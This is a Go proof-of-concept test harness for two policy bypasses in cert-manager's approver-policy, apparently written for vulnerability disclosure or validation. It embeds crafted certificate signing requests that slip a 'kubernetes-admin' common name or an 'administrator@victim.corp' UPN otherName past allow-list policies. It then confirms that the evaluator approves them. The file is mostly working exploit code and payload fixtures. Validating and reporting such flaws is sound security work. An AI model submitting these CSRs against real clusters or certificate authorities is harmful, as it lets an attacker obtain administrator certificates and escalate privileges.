//go:build pocbypass

/*
PoC validation harness for VC-53794 and VC-53795.
Not part of the upstream test suite — guarded by the `pocbypass` build tag.

Drop this file into pkg/internal/approver/allowed/ and run:

    go test -tags pocbypass -run TestPoC -v ./pkg/internal/approver/allowed/
*/

package allowed

import (
	"context"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/asn1"
	"encoding/hex"
	"encoding/pem"
	"testing"

	cmapi "github.com/cert-manager/cert-manager/pkg/apis/certmanager/v1"
	"k8s.io/utils/ptr"

	policyapi "github.com/cert-manager/approver-policy/pkg/apis/policy/v1alpha1"
	"github.com/cert-manager/approver-policy/pkg/approver"
)

// CSR with two CN attributes in the Subject RDNSequence:
//
//	CN=kubernetes-admin, CN=app.tenant.example.com
const dualCNCSRPEM = `-----BEGIN CERTIFICATE REQUEST-----
MIICgTCCAWkCAQAwPDEZMBcGA1UEAwwQa3ViZXJuZXRlcy1hZG1pbjEfMB0GA1UE
AwwWYXBwLnRlbmFudC5leGFtcGxlLmNvbTCCASIwDQYJKoZIhvcNAQEBBQADggEP
ADCCAQoCggEBAJQlJY9X4EcVyHXnlzjI5C3K6WfE9LE/JcgandvpNnYRriE8hJOp
MVpDgwkc+5lBL47zmTSufyKVPDWikMIcc5q/92aHdmra6HDD4mzkBBNn/1rq8SlW
NqTQQ4ibmXRWojOhY0zR5tXASIHvAvicRdR4dHhR9BxHwtRAB8CcFB+H321HtCBO
3vg/jCi1NjNrGIaHY7MuLqw6fGNeGbPEZlqOale3I9gzVhPGSdk7zrBkpaxn93wm
01ICw9ZSGdJrj2gFIN41eobXjyCGYYuIiQ5QTR5yo6pcvX1PBddgKF2W3SYmHucx
YrIYxQzGbfFA7aLj+tKGo+4WC3wuF36jmLcCAwEAAaAAMA0GCSqGSIb3DQEBCwUA
A4IBAQCIUK+iXyjd02I/AY1tJrN554BJ8/cxil1HSeYpsWY4FqU8KVzUEWSq0KDx
S6o2C0ozCafkkIC847feraMfFpVjOC5ouIBeXOYQBHwzyABXZ+oCAKDoONU2lLEG
KPM6koRjku9XP8U8002tCpE+C9wK3I1Wn2G+c7uBFcs49+6RLme2oM76nqGOfEiA
kD53PR446DawiVCtlMFcy2IKGiKDCstTBmKqjrLO7jmQrQypRLoEvxRrydIHch7h
8+wZMJ5CSKsCz39K8jwfohn0LxtzLkQJQDRpPM3PW0E7zqyF2QBZlH0Wrn+gUHUT
1I8JVAC1H69//7FXoN4hRcMo1lU1
-----END CERTIFICATE REQUEST-----`

// CSR with SAN containing DNS:allowed.example.com + otherName:msUPN=administrator@victim.corp
const otherNameCSRPEM = `-----BEGIN CERTIFICATE REQUEST-----
MIICoTCCAYkCAQAwADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAONe
9nHqStePH1TidOXRfRPwgcupdThTgf50vSmA6mMXUyOSUa9Y2LtUw3hTcGwGtyzv
wI/KkRq8qavFj8tVTOTR/ERb0YydQj2JSlgyAiztJoRkYyGKE8v6JW4m/6rVBCML
Pg9OLGr0wrkcTq1DvXWVOoKlzpn1DnBYuHGTVhb5BzxyzfvVJ5V4/LP2pJisHgDw
uPFkWQkgsKp7ePoh7W728pPQHrPD/1c0Qo+jnByjfTBHUUGl0tk1s1BveWur4NwY
DHLsJT9zGL02fJoTzIZT1Ho4nXXdXCJlVpDHAk1ltGzacq/Uv16jnBGoppW/Zkcm
/Yfk0JV8RUTnrnLm54MCAwEAAaBcMFoGCSqGSIb3DQEJDjFNMEswSQYDVR0RBEIw
QIITYWxsb3dlZC5leGFtcGxlLmNvbaApBgorBgEEAYI3FAIDoBsMGWFkbWluaXN0
cmF0b3JAdmljdGltLmNvcnAwDQYJKoZIhvcNAQELBQADggEBAOGwxl+hDeu6Mwpb
zWRXFGfE3o720rBtdOE0nNj5RaRioq1oMCtB9CKfO030XDJu7Y0NW4LA4G27Yqcj
6On0SWmqi+Xm365ArwFnvxkKhe7FaqLmGo6Ahe7bsJR3OUjkAIiLqkOEHbDCM9Tk
L3ElFZyDJFoU7hfzKDZQ66xtsSksRPhmIL9+u4fleZgf2kztzYh6tMl/4S0oK2KT
qK0jsdBuGtWPi5/AG+LU5lOqzCgfntNqXx6GoyZ+CLhGT6zfWzXl4wNxjsvQ06sp
5ow1UPYQuJwWcZKVfl0mYLf5Ax8E+WPOUk2/DRud4uKgtuSCuhoeeXISpcZ6n65g
wTcZY/M=
-----END CERTIFICATE REQUEST-----`

// VC-53794 — RawSubject duplicate-CN bypass.
// Policy: allowed.commonName.value = "*.tenant.example.com" (no other identities permitted).
// CSR Subject RDNSequence = {CN=kubernetes-admin, CN=app.tenant.example.com}.
// A correct gate MUST deny (first CN is disallowed). Bypass = evaluator returns ResultNotDenied.
func TestPoC_VC53794_RawSubjectDualCN(t *testing.T) {
	blk, _ := pem.Decode([]byte(dualCNCSRPEM))
	if blk == nil {
		t.Fatal("failed to decode embedded CSR PEM")
	}
	csr, err := x509.ParseCertificateRequest(blk.Bytes)
	if err != nil {
		t.Fatalf("parse CSR: %v", err)
	}
	pemBytes := []byte(dualCNCSRPEM)

	// What the evaluator sees (lossy pkix.Name projection)
	t.Logf("evaluator view: csr.Subject.CommonName = %q", csr.Subject.CommonName)

	// What the signer will copy verbatim (csr.RawSubject)
	var rdn pkix.RDNSequence
	if _, err := asn1.Unmarshal(csr.RawSubject, &rdn); err != nil {
		t.Fatalf("unmarshal RawSubject: %v", err)
	}
	var cns []string
	for _, set := range rdn {
		for _, atv := range set {
			if atv.Type.Equal(asn1.ObjectIdentifier{2, 5, 4, 3}) {
				cns = append(cns, atv.Value.(string))
			}
		}
	}
	t.Logf("signer view:    csr.RawSubject CN values = %v  (count=%d)", cns, len(cns))
	if len(cns) != 2 || cns[0] != "kubernetes-admin" {
		t.Fatalf("CSR fixture malformed: expected 2 CNs with kubernetes-admin first, got %v", cns)
	}

	policy := &policyapi.CertificateRequestPolicy{
		Spec: policyapi.CertificateRequestPolicySpec{
			Allowed: &policyapi.CertificateRequestPolicyAllowed{
				CommonName: &policyapi.CertificateRequestPolicyAllowedString{
					Value: ptr.To("*.tenant.example.com"),
				},
			},
		},
	}
	cr := &cmapi.CertificateRequest{Spec: cmapi.CertificateRequestSpec{Request: pemBytes}}

	resp, err := Approver().Evaluate(context.Background(), policy, cr)
	if err != nil {
		t.Fatalf("Evaluate returned error: %v", err)
	}
	t.Logf("Evaluate() => Result=%v Message=%q", resp.Result, resp.Message)

	if resp.Result == approver.ResultNotDenied {
		t.Logf(">>> BYPASS CONFIRMED: policy allowing only CN='*.tenant.example.com' returned NotDenied for a CSR whose RawSubject contains CN=kubernetes-admin")
	} else {
		t.Fatalf("NOT VULNERABLE: evaluator denied the dual-CN CSR (Result=%v) — bug appears fixed", resp.Result)
	}

	// Negative control: same policy, single forbidden CN — must be DENIED (proves policy is enforcing)
	ctrl := &cmapi.CertificateRequest{Spec: cmapi.CertificateRequestSpec{Request: csrFrom(t, func(c *x509.CertificateRequest) error { c.Subject.CommonName = "kubernetes-admin"; return nil })}}
	cresp, _ := Approver().Evaluate(context.Background(), policy, ctrl)
	t.Logf("control (single CN=kubernetes-admin): Result=%v Message=%q", cresp.Result, cresp.Message)
	if cresp.Result != approver.ResultDenied {
		t.Fatalf("control failed: policy did not deny a plain CN=kubernetes-admin CSR — test invalid")
	}
}

// VC-53795 — SAN otherName bypass.
// Policy: allowed.dnsNames.values = ["allowed.example.com"] (no other identities permitted).
// CSR SAN = {DNS:allowed.example.com, otherName:msUPN=administrator@victim.corp}.
// A correct gate MUST deny (otherName identity not in allow-list). Bypass = ResultNotDenied.
func TestPoC_VC53795_SANOtherName(t *testing.T) {
	blk, _ := pem.Decode([]byte(otherNameCSRPEM))
	if blk == nil {
		t.Fatal("failed to decode embedded CSR PEM")
	}
	csr, err := x509.ParseCertificateRequest(blk.Bytes)
	if err != nil {
		t.Fatalf("parse CSR: %v", err)
	}
	pemBytes := []byte(otherNameCSRPEM)

	// What the evaluator sees (Go stdlib projection: tags 1/2/6/7 only)
	t.Logf("evaluator view: csr.DNSNames=%v IPAddresses=%v URIs=%v EmailAddresses=%v",
		csr.DNSNames, csr.IPAddresses, csr.URIs, csr.EmailAddresses)

	// What the signer will copy verbatim (raw SAN extension OID 2.5.29.17)
	var rawSAN []byte
	for _, e := range csr.Extensions {
		if e.Id.Equal(asn1.ObjectIdentifier{2, 5, 29, 17}) {
			rawSAN = e.Value
		}
	}
	if rawSAN == nil {
		t.Fatalf("CSR fixture malformed: no SAN extension")
	}
	var seq []asn1.RawValue
	if _, err := asn1.Unmarshal(rawSAN, &seq); err != nil {
		t.Fatalf("unmarshal SAN: %v", err)
	}
	var tags []int
	for _, gn := range seq {
		tags = append(tags, gn.Tag)
	}
	t.Logf("signer view:    raw SAN GeneralName tags = %v  (0=otherName 2=dNSName)", tags)
	t.Logf("signer view:    raw SAN hex = %s", hex.EncodeToString(rawSAN))
	hasOtherName := false
	for _, tag := range tags {
		if tag == 0 {
			hasOtherName = true
		}
	}
	if !hasOtherName {
		t.Fatalf("CSR fixture malformed: no otherName (tag 0) in SAN")
	}

	policy := &policyapi.CertificateRequestPolicy{
		Spec: policyapi.CertificateRequestPolicySpec{
			Allowed: &policyapi.CertificateRequestPolicyAllowed{
				DNSNames: &policyapi.CertificateRequestPolicyAllowedStringSlice{
					Values: ptr.To([]string{"allowed.example.com"}),
				},
			},
		},
	}
	cr := &cmapi.CertificateRequest{Spec: cmapi.CertificateRequestSpec{Request: pemBytes}}

	resp, err := Approver().Evaluate(context.Background(), policy, cr)
	if err != nil {
		t.Fatalf("Evaluate returned error: %v", err)
	}
	t.Logf("Evaluate() => Result=%v Message=%q", resp.Result, resp.Message)

	if resp.Result == approver.ResultNotDenied {
		t.Logf(">>> BYPASS CONFIRMED: policy allowing only DNS=[allowed.example.com] returned NotDenied for a CSR whose raw SAN extension contains otherName:msUPN=administrator@victim.corp")
	} else {
		t.Fatalf("NOT VULNERABLE: evaluator denied the otherName CSR (Result=%v) — bug appears fixed", resp.Result)
	}

	// Negative control: same policy, DNS:evil.example.com — must be DENIED (proves policy is enforcing)
	ctrl := &cmapi.CertificateRequest{Spec: cmapi.CertificateRequestSpec{Request: csrFrom(t, func(c *x509.CertificateRequest) error { c.DNSNames = []string{"evil.example.com"}; return nil })}}
	cresp, _ := Approver().Evaluate(context.Background(), policy, ctrl)
	t.Logf("control (DNS=evil.example.com): Result=%v Message=%q", cresp.Result, cresp.Message)
	if cresp.Result != approver.ResultDenied {
		t.Fatalf("control failed: policy did not deny DNS=evil.example.com — test invalid")
	}
}
